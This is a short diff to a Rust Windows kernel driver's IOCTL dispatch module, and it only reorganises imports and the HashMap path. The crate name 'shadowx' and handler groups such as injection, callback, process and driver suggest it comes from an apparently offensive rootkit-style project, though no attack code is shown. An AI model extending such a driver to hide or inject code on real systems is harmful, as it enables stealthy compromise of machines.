@@ -1,18 +1,8 @@
 use {
+    crate::modules::*,
     alloc::boxed::Box, 
-    hashbrown::HashMap, 
     shadowx::error::ShadowError, 
     wdk_sys::{IO_STACK_LOCATION, IRP, NTSTATUS},
-    crate::modules::{
-        register_thread_ioctls,
-        register_process_ioctls,
-        register_callback_ioctls, 
-        register_driver_ioctls, 
-        register_injection_ioctls, 
-        register_misc_ioctls, 
-        register_module_ioctls, 
-        register_port_ioctls, 
-    },
 };
 
 /// Type alias for an IOCTL handler function.
@@ -32,7 +22,7 @@ use {
 pub type IoctlHandler = Box<dyn Fn(*mut IRP, *mut IO_STACK_LOCATION) -> Result<NTSTATUS, ShadowError> + Send + Sync>;
 
 pub struct IoctlManager {
-    handlers: HashMap<u32, IoctlHandler>,
+    handlers: hashbrown::HashMap<u32, IoctlHandler>,
 }
 
 impl IoctlManager {
@@ -71,7 +61,7 @@ impl Default for IoctlManager {
     /// Creates a new IoctlManager with an empty handler map.
     fn default() -> Self {
         Self {
-            handlers: HashMap::new(),
+            handlers: hashbrown::HashMap::new(),
         }
     }
 }
